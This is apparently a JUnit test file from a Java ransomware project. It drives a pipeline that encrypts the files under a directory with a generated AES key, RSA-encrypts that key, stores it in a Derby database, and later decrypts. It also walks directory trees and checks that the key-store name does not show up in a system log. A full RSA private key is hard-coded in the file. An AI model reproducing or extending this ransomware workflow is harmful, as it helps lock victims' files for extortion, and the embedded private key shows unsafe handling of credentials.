package com.Examples;

import com.security.*;
import org.apache.commons.io.FileUtils;
import org.apache.commons.io.filefilter.TrueFileFilter;
import org.junit.jupiter.api.*;

import javax.crypto.SecretKey;
import java.io.File;
import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.GeneralSecurityException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.sql.SQLException;
import java.util.Collection;
import java.util.Objects;
import java.util.stream.Stream;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;

@TestMethodOrder(MethodOrderer.OrderAnnotation.class)
public class ExampleTest {
    private static final String PubicKey = "MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAJCw1HHQooCFGsGhtxNrsdS6dDq5jtfHqqLInCj7qFlDaD/Sll5+BAUjV0GU/c+6PVyMKzmLrHh49eeGQy1ETN8CAwEAAQ==";
    private static final String PrivateKey = "MIIBVAIBADANBgkqhkiG9w0BAQEFAASCAT4wggE6AgEAAkEAkLDUcdCigIUawaG3E2ux1Lp0OrmO18eqosicKPuoWUNoP9KWXn4EBSNXQZT9z7o9XIwrOYuseHj154ZDLURM3wIDAQABAkA9AnLx8tkye+2GTBwYEkcPvfcYc/mpPsXSkehW15Zq3IALx3Kr5GgKGOaB2FK6PU0QzEPQbNJXdA5ZPjwTDcQBAiEA1/zINRVlrLpw2HPfqsYQ8ZSDuG2rVUUKKmKgJQXeQ98CIQCrfsw2+VKOaFoJm5BpVxIT5nsE8CXn4fr/WSFuklMXAQIgTKWnAreCKmbLTvTn5bl+H8zdZaB9kbf7YIk5XYoUky8CIQCL2ccnPYK5ZxelphrKDJtNZzMC/+OpiXtqKIE+7kycAQIgRK/DUhWUgSQV5u7VoCHDyLPCntjFMGBsg7Wi1uq+EDM=";


    @Test
    @Order(1)
    public void PipelineTest() throws URISyntaxException {
        Path testPath = Paths.get("C:\\Users\\User\\Documents\\GitHub\\JavaRansomware\\just");
        //Path testPath = Paths.get(Objects.requireNonNull(ExampleTest.class.getResource("/test.txt")).toURI());
        PipelineData pipelineData = new PipelineData();
        pipelineData.setPrivateKey(PrivateKey);
        pipelineData.setPublicKey(PubicKey);
        pipelineData.setRootPath(testPath.toAbsolutePath().toString());

        Pipeline<PipelineData, PipelineData> encrypt_filters = new Pipeline<PipelineData, PipelineData>(new DatabaseRetrieveHandler())
                .addHandler(new DecryptKeyHandler())
                .addHandler(new GenSymmetricKeyHandler())
                .addHandler(new RansomwareEncryptHandler())
                .addHandler(new EncryptKeyHandler())
                .addHandler(new DatabaseStoreHandler());
        var encrypt_output = encrypt_filters.execute(pipelineData);
        System.out.println("Pipeline output: " + encrypt_output);


        Pipeline<PipelineData, PipelineData> decrypt_filters = new Pipeline<PipelineData, PipelineData>(new DatabaseRetrieveHandler())
                .addHandler(new DecryptKeyHandler())
                .addHandler(new RansomwareDecryptHandler());
        var decrypt_output = decrypt_filters.execute(pipelineData);
        System.out.println("Pipeline output: " + decrypt_output);
    }

    @Test
    @Order(2)
    public void DatabaseTest() {
        try {
            // Check if a string already exists
            String existingString = DerbyStorage.getInstance().retrieveString();

            if (existingString != null) {
                System.out.println("Retrieved existing string: " + existingString);
            } else {
                // Store a new string
                DerbyStorage.getInstance().storeString("Hello, Derby!");

                // Retrieve and display the stored string
                String retrievedString = DerbyStorage.getInstance().retrieveString();
                System.out.println("Retrieved newly stored string: " + retrievedString);
            }
        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            //DerbyStorage.getInstance().close();
        }
    }

    @Test
    @Order(3)
    public void PrintAllPaths() {
        String logFilePath = "path/to/system.log"; // Replace with the actual log file path
        String searchString = "encryptedKeyDB"; // Replace with the string you want to search for
        Path rootPath = Paths.get("C:\\Users\\User\\Documents\\GitHub\\JavaRansomware\\");
        Collection<File> files = FileUtils.listFilesAndDirs(
                rootPath.toFile(),
                TrueFileFilter.INSTANCE,
                TrueFileFilter.INSTANCE
        );
        files.parallelStream().forEach(file -> {
            if (file.toPath().toAbsolutePath().toString().contains(searchString)) {
                return;
            }
            if (file.isDirectory()) {
                System.out.println("Directory: " + file);
            } else {
                System.out.println("File: " + file.toPath().toAbsolutePath());
            }
        });

        try (Stream<String> stream = Files.lines(Paths.get(logFilePath))) {
            boolean found = stream.anyMatch(line -> line.contains(searchString));
            assertFalse(found);
        } catch (IOException e) {
            //e.printStackTrace();
        }
    }

    @Test
    @Order(4)
    public void RSAEncryption() throws GeneralSecurityException {
        String message = "Hello, RSA!";
        RSAGenKeyReader.StringKeyPair keyPair = RSAGenKeyReader.generateKeyPair();
        PublicKey pub = RSAGenKeyReader.loadPublicKey(keyPair.publicKey());
        PrivateKey privateKey = RSAGenKeyReader.loadPrivateKey(keyPair.privateKey());
        String encrypted = RSACipher.getInstance().encrypt(message.getBytes(StandardCharsets.UTF_8), pub);
        String res = RSACipher.getInstance().decrypt(encrypted, privateKey);
        assertEquals(message, res);
    }

    @Test
    @Order(5)
    public void AESEncryption() throws Exception {
        Path testPath = Paths.get(Objects.requireNonNull(ExampleTest.class.getResource("/test.txt")).toURI());
        SecretKey key = AESCipher.generateAndSaveKey("secret.key");
        AESCipher.encryptFile(testPath.toFile().getPath(), key);
        AESCipher.decryptFile(testPath.toFile().getPath(), key);
    }

    @Test
    @Order(6)
    public void RSAWithAESEncryption() throws Exception {
        Path testPath = Paths.get(Objects.requireNonNull(ExampleTest.class.getResource("/test.txt")).toURI());
        String key = AESCipher.generateAndNotSaveKeyAsString();
        RSAGenKeyReader.StringKeyPair keyPair = RSAGenKeyReader.generateKeyPair();
        PublicKey pub = RSAGenKeyReader.loadPublicKey(keyPair.publicKey());
        PrivateKey privateKey = RSAGenKeyReader.loadPrivateKey(keyPair.privateKey());
        String encrypted = RSACipher.getInstance().encrypt(key.getBytes(StandardCharsets.UTF_8), pub);
        String encodedkey = RSACipher.getInstance().decrypt(encrypted, privateKey);
        SecretKey copykey = AESCipher.loadKey(encodedkey);
        AESCipher.encryptFile(testPath.toFile().getPath(), copykey);
        AESCipher.decryptFile(testPath.toFile().getPath(), copykey);
    }

    @AfterAll
    public static void tearDown() {
        DerbyStorage.getInstance().close();
    }
}
